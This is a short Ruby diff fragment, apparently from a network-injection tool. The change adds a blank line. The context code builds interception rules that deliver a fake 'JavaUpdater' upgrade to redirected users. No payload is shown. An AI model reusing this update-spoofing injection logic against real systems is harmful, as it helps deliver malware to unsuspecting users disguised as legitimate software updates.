@@ -93,6 +93,7 @@ class InjectorTask
             end
           end
           FileUtils.rm_rf(temp_zip)
+
         when 'INJECT-UPGRADE'
           appname = 'JavaUpdater' + progressive.to_s
           intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{appname} #{rule.resource}"
